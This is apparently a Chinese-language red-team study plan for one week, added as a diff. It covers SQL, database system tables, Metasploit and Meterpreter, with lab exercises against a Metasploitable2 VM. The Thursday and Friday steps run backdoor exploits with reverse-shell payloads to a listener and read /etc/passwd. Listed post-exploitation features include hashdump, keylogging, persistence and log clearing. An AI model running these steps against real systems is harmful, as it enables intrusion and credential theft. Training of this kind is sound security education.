@@ -1,0 +1,356 @@
+================================================================================
+第11周：数据库基础与漏洞利用入门 (Web入门期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"SQL注入漏洞利用"为贯穿案例，学员先掌握数据库基础操作（SQL语法、数据库结构），
+再学习Metasploit漏洞利用框架的基本使用流程，为后续SQL注入攻击和漏洞利用打下坚实基础。
+本阶段属于红队学习路径中的"Web入门期"，从数据库理论切入，逐步过渡到实战漏洞利用。
+
+【本周学习目标】
+1. 掌握SQL语言的核心操作：SELECT、INSERT、UPDATE、DELETE、UNION、JOIN
+2. 理解关系型数据库结构：数据库->表->列->行、主键、外键、索引
+3. 熟悉系统数据库表（information_schema）的结构和作用
+4. 掌握Metasploit框架的基本架构和msfconsole命令行操作
+5. 能够使用Metasploit执行完整的漏洞利用流程：搜索模块、配置参数、执行攻击
+6. 掌握Meterpreter基础功能：文件操作、进程管理、网络操作、权限提升
+7. 理解漏洞利用的基本生命周期：扫描->选择漏洞->配置Payload->执行->后渗透
+
+【本周知识清单】
+★ 数据库基础
+  - SQL语句类型：DML（SELECT/INSERT/UPDATE/DELETE）、DDL（CREATE/ALTER/DROP）、DCL（GRANT/REVOKE）
+  - UNION联合查询原理与使用
+  - JOIN类型：INNER JOIN、LEFT JOIN、RIGHT JOIN、FULL JOIN
+  - WHERE条件过滤、ORDER BY排序、GROUP BY分组、LIMIT限制
+  - 数据库系统表：information_schema.tables、information_schema.columns
+  - MySQL、PostgreSQL、MSSQL数据库的系统表差异
+  - 数据库用户、权限、认证机制基础
+
+★ Metasploit基础
+  - Metasploit框架架构：Modules、Payloads、Encoders、Nops、Post
+  - msfconsole界面和基础命令
+  - 模块分类：exploit、auxiliary、post、payload、encoder、nop
+  - search命令使用（按cve、platform、type、name搜索）
+  - use命令选择模块，show options查看参数
+  - set/unset/setg/unsetg配置参数
+  - RHOSTS/RPORT/LHOST/LPORT等核心参数含义
+  - exploit/run命令执行攻击
+  - sessions命令管理会话
+
+★ Meterpreter基础
+  - Meterpreter架构：stageless vs staged payload
+  - 核心命令：sysinfo、getuid、getsystem、ps、migrate、shell
+  - 文件系统操作：ls、cd、download、upload、edit、cat
+  - 网络操作：ifconfig、route、portfwd
+  - 进程操作：ps、kill、execute、migrate
+  - 后渗透基础：hashdump、getsystem、bypassuac
+
+【本周工具清单】
+  - MySQL / MariaDB（数据库环境）
+  - Metasploit Framework（msfconsole）
+  - Meterpreter（后渗透载荷）
+  - ArchStrike Linux（渗透测试发行版）
+
+================================================================================
+周一：SQL基础（SELECT/INSERT/UPDATE/DELETE/UNION/JOIN）
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：SQL语言概述、数据查询语言DQL、数据操作语言DML
+  - SELECT语句结构：SELECT 列 FROM 表 WHERE 条件 ORDER BY 列 LIMIT n
+  - INSERT INTO语句：插入单行/多行数据
+  - UPDATE语句：更新指定条件的数据行
+  - DELETE语句：删除指定条件的数据行
+  - UNION操作符：合并多个SELECT结果集（UNION vs UNION ALL）
+  - JOIN连接：INNER JOIN内连接、LEFT/RIGHT JOIN外连接
+  - WHERE条件：比较运算符、逻辑运算符、LIKE模糊匹配、BETWEEN范围
+  - NULL值处理：IS NULL、IS NOT NULL
+  参考文件：/home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：搭建MySQL环境并执行SQL语句练习
+  参考文件：/home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+
+  操作步骤：
+    Step 1: sudo systemctl start mysql/mariadb 启动数据库服务
+    Step 2: sudo mysql -u root 进入MySQL控制台
+    Step 3: CREATE DATABASE pentest_db; 创建测试数据库
+    Step 4: USE pentest_db; 选择数据库
+    Step 5: CREATE TABLE users (id INT PRIMARY KEY AUTO_INCREMENT, username VARCHAR(50), password VARCHAR(100), email VARCHAR(100), role VARCHAR(20));
+    Step 6: INSERT INTO users (username, password, email, role) VALUES ('admin', 'admin123', 'admin@test.com', 'admin'), ('user1', 'pass1', 'user1@test.com', 'user'), ('user2', 'pass2', 'user2@test.com', 'user'), ('guest', 'guest', 'guest@test.com', 'guest');
+    Step 7: SELECT * FROM users; 验证数据插入
+    Step 8: SELECT username, email FROM users WHERE role='admin'; 条件查询
+    Step 9: UPDATE users SET password='newpass' WHERE username='user1'; 更新数据
+    Step 10: DELETE FROM users WHERE username='guest'; 删除数据
+    Step 11: CREATE TABLE products (id INT, name VARCHAR(100), price DECIMAL(10,2));
+    Step 12: INSERT INTO products VALUES (1, 'Laptop', 999.99), (2, 'Mouse', 19.99), (3, 'Keyboard', 49.99);
+    Step 13: SELECT users.username, products.name FROM users JOIN products ON users.id = products.id; 练习JOIN
+    Step 14: SELECT username, password FROM users UNION SELECT name, CAST(price AS CHAR) FROM products; 练习UNION
+    Step 15: SELECT * FROM users ORDER BY id DESC LIMIT 2; 排序和限制
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：数据库结构与系统表
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：关系型数据库内部结构、系统信息表、数据库元数据
+  - 数据库层次结构：数据库实例 -> 数据库(Schema) -> 表 -> 列 -> 行
+  - 主键(Primary Key)：唯一标识行的约束
+  - 外键(Foreign Key)：表间关联约束
+  - 索引(Index)：加速查询的数据结构（B-Tree、Hash）
+  - information_schema数据库结构：
+    * information_schema.tables：存储所有表信息（table_schema, table_name, table_type）
+    * information_schema.columns：存储所有列信息（table_schema, table_name, column_name, data_type）
+    * information_schema.schemata：存储所有数据库名称
+  - MySQL系统数据库：mysql.user表存储用户认证信息
+  - PostgreSQL系统表：pg_catalog、pg_database、pg_tables
+  - MSSQL系统表：sys.databases、sys.tables、sys.columns
+  - 系统表在SQL注入中的利用价值（枚举数据库结构）
+  参考文件：/home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：深入探索数据库系统表，理解元数据结构
+  参考文件：/home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+
+  操作步骤：
+    Step 1: sudo mysql -u root 进入MySQL控制台
+    Step 2: USE information_schema; 切换到系统信息库
+    Step 3: SELECT table_schema, table_name FROM tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema'); 列出所有自定义数据库和表
+    Step 4: SELECT table_name FROM tables WHERE table_schema='pentest_db'; 查看pentest_db数据库中的所有表
+    Step 5: SELECT column_name, data_type, is_nullable FROM columns WHERE table_schema='pentest_db' AND table_name='users'; 查看users表的所有列及其数据类型
+    Step 6: SELECT schema_name FROM schemata; 列出所有数据库
+    Step 7: USE pentest_db; SHOW TABLES; 使用SHOW命令查看表
+    Step 8: DESCRIBE users; 查看表结构
+    Step 9: SHOW CREATE TABLE users; 查看建表语句
+    Step 10: SELECT table_name FROM information_schema.tables WHERE table_schema=database(); 查询当前数据库的所有表名
+    Step 11: SELECT column_name FROM information_schema.columns WHERE table_name='users'; 查询users表的所有列名
+    Step 12: 在information_schema.columns中探索mysql.user表结构
+    Step 13: CREATE TABLE sensitive_data (id INT, credit_card VARCHAR(20), ssn VARCHAR(20)); 创建敏感数据表模拟
+    Step 14: INSERT INTO sensitive_data VALUES (1, '4111-1111-1111-1111', '123-45-6789');
+    Step 15: 使用information_schema查询sensitive_data表结构，理解攻击者如何通过SQL注入枚举数据库结构
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：Metasploit入门 (msfconsole基础)
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Metasploit框架架构、核心概念和msfconsole基本操作
+  - Metasploit Framework (MSF) 概述：开源渗透测试框架
+  - 核心组件：
+    * Modules（模块）：exploit、auxiliary、post、payload、encoder、nop
+    * Libraries（库）：Rex、Msf::Core、Msf::Base
+    * Interfaces（接口）：msfconsole、msfcli、msfweb、Armitage
+    * Plugins（插件）：扩展功能
+  - Exploit模块：利用目标漏洞的代码
+  - Auxiliary模块：扫描、嗅探、fuzzing等辅助功能
+  - Payload：在目标系统上执行的代码（staged vs stageless）
+  - Encoder：编码payload以绕过检测
+  - 数据库集成：workspace、hosts、services、vulns、loots、notes
+  - msfconsole启动和初始配置
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：启动msfconsole，学习基础命令和模块浏览
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+  操作步骤：
+    Step 1: sudo msfconsole 启动Metasploit控制台（首次启动需等待数据库初始化）
+    Step 2: version 查看MSF版本信息
+    Step 3: help 查看所有可用命令列表
+    Step 4: show -h 查看show命令的帮助信息
+    Step 5: show exploits 列出所有exploit模块（非常多，按Ctrl+C可中断）
+    Step 6: show auxiliary 列出所有auxiliary辅助模块
+    Step 7: show payloads 列出所有payload模块
+    Step 8: workspace 查看当前工作区
+    Step 9: workspace -a week11 创建一个名为week11的新工作区
+    Step 10: search smb 搜索与SMB协议相关的所有模块
+    Step 11: search type:exploit platform:linux 搜索Linux平台的漏洞利用模块
+    Step 12: search cve:2017 搜索CVE编号包含2017的模块
+    Step 13: search smb type:auxiliary 搜索SMB相关的辅助模块
+    Step 14: back 返回上一级上下文
+    Step 15: exit 退出msfconsole
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：Metasploit漏洞利用流程
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Metasploit完整漏洞利用工作流程
+  - 漏洞利用六步法：
+    1. 选择模块 (search + use)
+    2. 查看配置 (show options)
+    3. 设置参数 (set/setg)
+    4. 选择payload (show payloads + set PAYLOAD)
+    5. 执行攻击 (exploit/run)
+    6. 后渗透操作 (sessions -i)
+  - 关键参数详解：
+    * RHOST/RHOSTS：目标IP地址（支持CIDR和范围）
+    * RPORT：目标端口
+    * LHOST：本地监听IP（用于反向连接payload）
+    * LPORT：本地监听端口
+    * TARGET：目标操作系统/版本（自动或手动选择）
+    * SSL：是否使用SSL
+  - Payload类型：
+    * reverse_tcp：反向TCP连接（目标连接回攻击者）
+    * bind_tcp：正向TCP连接（攻击者连接目标开放端口）
+    * reverse_http/reverse_https：通过HTTP/HTTPS反向连接（更隐蔽）
+  - 会话管理：sessions、background、sessions -i、sessions -k
+  - 常见错误排查：防火墙阻止、payload不兼容、目标不可达
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：对Metasploitable2靶机执行完整的漏洞利用流程
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+  操作步骤：
+    Step 1: sudo msfconsole 启动Metasploit
+    Step 2: workspace -a week11_exploit 创建工作区
+    Step 3: db_nmap -sV -O 192.168.56.101 对Metasploitable2执行端口扫描（使用数据库辅助）
+    Step 4: hosts 查看已发现的主机信息
+    Step 5: services 查看已发现的服务信息
+    Step 6: search vsftpd 搜索vsftpd相关漏洞模块
+    Step 7: use exploit/unix/ftp/vsftpd_234_backdoor 选择vsftpd后门利用模块
+    Step 8: show options 查看需要配置的参数
+    Step 9: set RHOSTS 192.168.56.101 设置目标IP
+    Step 10: show payloads 查看可用payload
+    Step 11: set PAYLOAD cmd/unix/interact 设置payload为Unix命令交互
+    Step 12: check 检查目标是否存在该漏洞
+    Step 13: exploit 执行漏洞利用
+    Step 14: whoami && id && uname -a 验证获取的shell权限
+    Step 15: background 将当前会话放入后台
+    Step 16: sessions 查看所有会话
+    Step 17: sessions -i 1 重新接入会话
+    Step 18: exit 退出会话，返回msfconsole
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：Meterpreter基础
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Meterpreter后渗透载荷的高级功能和使用方法
+  - Meterpreter vs 普通Shell对比：
+    * 运行在内存中，不落盘（无文件攻击）
+    * 加密通信（TLS加密的C2通道）
+    * 模块化架构（可动态加载扩展）
+    * 支持多平台（Windows/Linux/macOS/Android）
+  - Staged vs Stageless Payload：
+    * Staged：先传送小stager建立连接，再下载完整Meterpreter
+    * Stageless：直接传送完整Meterpreter功能
+  - 核心命令组：
+    * 系统信息：sysinfo, getuid, getpid, getprivs
+    * 文件系统：ls, cd, pwd, cat, download, upload, rm, mkdir, rmdir
+    * 进程管理：ps, kill, execute, migrate, getpid
+    * 网络操作：ifconfig, route, arp, netstat, portfwd
+    * 权限提升：getsystem, bypassuac
+    * 凭证获取：hashdump, credcollect, mimikatz
+    * 摄像头/麦克风：webcam_list, webcam_snap, record_mic
+    * 键盘记录：keyscan_start, keyscan_dump, keyscan_stop
+    * 持久化：run persistence
+    * 清理痕迹：clearev
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：获取Meterpreter会话并进行后渗透操作练习
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+  操作步骤：
+    Step 1: sudo msfconsole 启动Metasploit
+    Step 2: search samba usermap 搜索Samba漏洞
+    Step 3: use exploit/multi/samba/usermap_script 选择Samba usermap exploit
+    Step 4: set RHOSTS 192.168.56.101 设置目标IP
+    Step 5: set PAYLOAD cmd/unix/reverse_netcat 设置反向netcat payload
+    Step 6: set LHOST 192.168.56.1 设置本地监听IP
+    Step 7: exploit 执行攻击（获取shell后继续以下操作）
+    Step 8: python -c 'import pty; pty.spawn("/bin/bash")' 升级为交互式shell
+    Step 9: Ctrl+Z 将shell放入后台
+    Step 10: 另一种获取Meterpreter会话的方式：
+    Step 11: use exploit/unix/irc/unreal_ircd_3281_backdoor 选择IRC后门exploit
+    Step 12: set RHOSTS 192.168.56.101
+    Step 13: set PAYLOAD cmd/unix/reverse_perl 设置perl反向payload
+    Step 14: set LHOST 192.168.56.1
+    Step 15: exploit
+    Step 16: sessions 查看所有活跃会话
+    Step 17: sessions -u 1 尝试将会话升级为Meterpreter（如支持）
+    Step 18: 在新Meterpreter会话中练习：getuid, sysinfo, ps, ifconfig, ls /home, cat /etc/passwd, download /etc/passwd /tmp/
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB Starting Point)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - SQL五种核心操作回顾：各写5条练习SELECT/INSERT/UPDATE/DELETE/UNION/JOIN
+  - 数据库系统表复习：information_schema.tables和columns的常用查询
+  - Metasploit命令回顾：search -> use -> show options -> set -> exploit完整流程
+  - Meterpreter核心命令背诵：sysinfo/getuid/ps/download/upload/shell
+
+💻 第2小时 | 漏洞利用流程串联练习 (09:00 - 10:00)
+  练习目标：不参考笔记，独立完成一次完整的漏洞利用流程
+  操作步骤：
+    Step 1: 启动Metasploitable2靶机
+    Step 2: 使用nmap扫描目标开放端口和服务
+    Step 3: 在msfconsole中搜索可用漏洞模块
+    Step 4: 选择exploit模块并配置参数
+    Step 5: 执行攻击获取shell
+    Step 6: 进行基础后渗透操作（收集系统信息、浏览文件系统）
+
+🔓 第3小时 | HackTheBox Starting Point (10:00 - 11:00)
+  练习内容：注册HTB账号，完成Starting Point入门挑战
+  操作步骤：
+    Step 1: 注册HackTheBox账号 (https://app.hackthebox.com)
+    Step 2: 连接HTB VPN (下载ovpn文件后: sudo openvpn lab_xxx.ovpn)
+    Step 3: 在Starting Point中选择Meow、Fawn或Dancing等入门机器
+    Step 4: 按照引导完成信息收集->漏洞利用->获取flag的完整流程
+    Step 5: 记录每个机器的攻击路径和使用的技术
+    Step 6: 提交flag并在HTB平台完成对应挑战
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+  /home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-base教学/04-漏洞评估与利用基础.txt
+
+在线练习：
+  - HackTheBox Starting Point (https://app.hackthebox.com/starting-point)
+  - Metasploitable2 靶机 (192.168.56.101)
+  - SQL在线练习 (https://sqlzoo.net / https://www.w3schools.com/sql/)
+
+推荐工具安装：
+  - Metasploit Framework (sudo apt install metasploit-framework)
+  - MySQL/MariaDB (sudo apt install mysql-server / mariadb-server)
+  - nmap (sudo apt install nmap)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
